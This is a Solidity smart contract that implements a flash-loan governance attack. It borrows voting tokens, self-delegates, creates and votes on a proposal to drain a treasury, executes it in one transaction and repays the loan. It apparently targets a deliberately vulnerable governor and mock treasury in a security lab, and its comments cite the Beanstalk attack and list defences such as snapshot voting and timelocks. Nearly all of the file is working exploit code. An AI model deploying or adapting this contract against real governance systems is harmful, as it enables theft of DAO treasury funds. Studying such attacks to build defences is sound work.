// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {IFlashLoanReceiver} from "../mocks/MockFlashLoanProvider.sol";

/**
 * @title FlashLoanAttack
 * @dev Exploits vulnerability VULN-1 in GovernorVulnerable:
 *      - Uses flash loans to borrow voting tokens
 *      - Immediately votes on a proposal with borrowed power
 *      - Executes the proposal (if no timelock)
 *      - Repays flash loan in the same transaction
 *
 * Real-world example: Beanstalk attack (April 2022, $181M stolen)
 *
 * Attack Flow:
 * 1. Attacker calls executeAttack()
 * 2. Attack contract requests flash loan from provider
 * 3. Provider transfers borrowed tokens to attack contract
 * 4. Provider calls executeOperation() callback
 * 5. In callback:
 *    - Delegate tokens to self
 *    - Create malicious proposal (drain treasury)
 *    - Vote on proposal with borrowed tokens
 *    - Execute proposal immediately
 * 6. Attacker repays flash loan + fee
 * 7. Attack contract keeps stolen funds
 *
 * Defense Mechanisms that block this:
 * - VULN-1 fix: Use getPastVotes() instead of getVotes() (snapshot voting)
 * - Voting delay: Delay between proposal creation and voting start
 * - Timelock: Delay between proposal passing and execution
 */

interface IFlashLoanProvider {
    function flashLoan(address token, uint256 amount, address receiver, bytes calldata data) external returns (bool);

    function getFlashLoanFee(uint256 amount) external view returns (uint256);
}

interface IGovernor {
    function propose(
        address[] memory targets,
        uint256[] memory values,
        bytes[] memory calldatas,
        string memory description
    ) external returns (uint256);

    function castVote(uint256 proposalId, uint8 support) external;

    function execute(
        address[] memory targets,
        uint256[] memory values,
        bytes[] memory calldatas,
        bytes32 descriptionHash
    ) external payable;

    function state(uint256 proposalId) external view returns (uint256);
}

interface IVotesToken {
    function delegate(address delegatee) external;

    function getVotes(address account) external view returns (uint256);
}

contract FlashLoanAttack is IFlashLoanReceiver {
    // ─────────────────────────────────────────────────────────────────────────
    // State
    // ─────────────────────────────────────────────────────────────────────────

    address public flashLoanProvider;
    address public governanceToken;
    address public governor;
    address public targetTreasury; // The treasury or target contract to drain
    address public attacker; // The account invoking the attack

    uint256 public stolenAmount; // Amount stolen in the attack
    bool public attackSucceeded;

    // ─────────────────────────────────────────────────────────────────────────
    // Events
    // ─────────────────────────────────────────────────────────────────────────

    event FlashLoanBorrowed(uint256 amount, uint256 fee);
    event ProposalCreated(uint256 proposalId, uint256 targetAmount);
    event VoteCasted(uint256 proposalId, uint256 weight);
    event ProposalExecuted(uint256 proposalId, uint256 amountStolen);
    event AttackFailed(string reason);

    // ─────────────────────────────────────────────────────────────────────────
    // Constructor
    // ─────────────────────────────────────────────────────────────────────────

    constructor(address _flashLoanProvider, address _governanceToken, address _governor, address _targetTreasury) {
        require(_flashLoanProvider != address(0), "Invalid flash loan provider");
        require(_governanceToken != address(0), "Invalid governance token");
        require(_governor != address(0), "Invalid governor");
        require(_targetTreasury != address(0), "Invalid target treasury");

        flashLoanProvider = _flashLoanProvider;
        governanceToken = _governanceToken;
        governor = _governor;
        targetTreasury = _targetTreasury;
    }

    // ─────────────────────────────────────────────────────────────────────────
    // Main Attack Function
    // ─────────────────────────────────────────────────────────────────────────

    /**
     * @notice Initiates the flash loan attack
     * @param loanAmount The amount of tokens to borrow via flash loan
     * @param treasuryDrainAmount The amount to attempt to steal from treasury
     */
    function executeAttack(uint256 loanAmount, uint256 treasuryDrainAmount) external returns (bool) {
        require(loanAmount > 0, "FlashLoanAttack: loan amount must be > 0");

        attacker = msg.sender;
        stolenAmount = 0;
        attackSucceeded = false;

        // Encode the attack parameters to pass to executeOperation callback
        bytes memory data = abi.encode(treasuryDrainAmount);

        // Request flash loan
        // The provider will call executeOperation() as a callback
        try IFlashLoanProvider(flashLoanProvider).flashLoan(governanceToken, loanAmount, address(this), data) returns (
            bool success
        ) {
            return success;
        } catch Error(string memory reason) {
            emit AttackFailed(reason);
            return false;
        } catch {
            emit AttackFailed("Unknown error during attack");
            return false;
        }
    }

    // ─────────────────────────────────────────────────────────────────────────
    // Flash Loan Callback (IFlashLoanReceiver)
    // ─────────────────────────────────────────────────────────────────────────

    /**
     * @notice Callback invoked by flash loan provider
     * This is where the actual attack happens:
     * 1. Delegate borrowed tokens to gain voting power
     * 2. Create malicious proposal
     * 3. Vote on proposal
     * 4. Execute proposal
     */
    function executeOperation(address token, uint256 amount, uint256 fee, bytes calldata data)
        external
        override
        returns (bool)
    {
        require(msg.sender == flashLoanProvider, "FlashLoanAttack: only flash loan provider can call");
        require(token == governanceToken, "FlashLoanAttack: token mismatch");

        emit FlashLoanBorrowed(amount, fee);

        // Decode the target treasury drain amount
        uint256 treasuryDrainAmount = abi.decode(data, (uint256));

        // Step 1: Delegate borrowed tokens to self to gain voting power
        // VULN-1: getVotes() returns current balance, so delegation immediately gives us voting power
        IVotesToken(governanceToken).delegate(address(this));

        // Verify our voting power is now substantial
        uint256 votingPower = IVotesToken(governanceToken).getVotes(address(this));
        require(votingPower > 0, "FlashLoanAttack: failed to gain voting power");

        // Step 2: Create a malicious proposal that drains the treasury
        address[] memory targets = new address[](1);
        targets[0] = targetTreasury;

        uint256[] memory values = new uint256[](1);
        values[0] = 0;

        bytes[] memory calldatas = new bytes[](1);
        // calldata for a simple withdrawal function on the treasury
        // Here we target a real MockTreasury method to transfer funds to this contract
        calldatas[0] =
            abi.encodeWithSignature("withdrawWithinLimit(address,uint256)", address(this), treasuryDrainAmount);

        string memory description = "PROPOSAL: Emergency Treasury Withdrawal";
        bytes32 descriptionHash = _hashDescription(description);

        uint256 proposalId = IGovernor(governor).propose(targets, values, calldatas, description);
        emit ProposalCreated(proposalId, treasuryDrainAmount);

        // Step 3: Vote on the proposal with borrowed tokens
        // Support: 1 = FOR
        IGovernor(governor).castVote(proposalId, 1);
        emit VoteCasted(proposalId, votingPower);

        // Step 4: Try to execute the proposal immediately
        // This works if there's no timelock (VULN-3)
        try IGovernor(governor).execute(targets, values, calldatas, descriptionHash) {
            // Successfully executed the malicious proposal
            attackSucceeded = true;
            stolenAmount = treasuryDrainAmount;
            emit ProposalExecuted(proposalId, treasuryDrainAmount);
        } catch {
            // Execution might fail due to state checks or timelock
            // But the proposal is still created and voted on
            emit AttackFailed("Failed to execute proposal in single transaction");
        }

        // Step 5: Must repay the flash loan + fee
        // Calculate total repayment amount
        uint256 repaymentAmount = amount + fee;

        // Transfer tokens back to the flash loan provider
        require(IERC20(token).transfer(msg.sender, repaymentAmount), "FlashLoanAttack: repayment failed");

        return true;
    }

    // ─────────────────────────────────────────────────────────────────────────
    // View functions
    // ─────────────────────────────────────────────────────────────────────────

    /**
     * @notice Get the cost of performing this attack
     * @param loanAmount The amount to borrow
     * @return The total cost (flash loan fee)
     */
    function getAttackCost(uint256 loanAmount) external view returns (uint256) {
        return IFlashLoanProvider(flashLoanProvider).getFlashLoanFee(loanAmount);
    }

    /**
     * @notice Check if attack succeeded
     */
    function wasAttackSuccessful() external view returns (bool) {
        return attackSucceeded;
    }

    /**
     * @notice Get amount stolen in successful attack
     */
    function getStolenAmount() external view returns (uint256) {
        return stolenAmount;
    }

    // ─────────────────────────────────────────────────────────────────────────
    // Emergency functions
    // ─────────────────────────────────────────────────────────────────────────

    /**
     * @notice Recover any tokens left in the contract (shouldn't be any)
     */
    function recoverToken(address token, address to) external {
        require(msg.sender == attacker, "Only attacker can recover");
        uint256 balance = IERC20(token).balanceOf(address(this));
        if (balance > 0) {
            require(IERC20(token).transfer(to, balance), "FlashLoanAttack: recover transfer failed");
        }
    }

    function _hashDescription(string memory description) internal pure returns (bytes32 hash) {
        assembly {
            hash := keccak256(add(description, 32), mload(description))
        }
    }
}
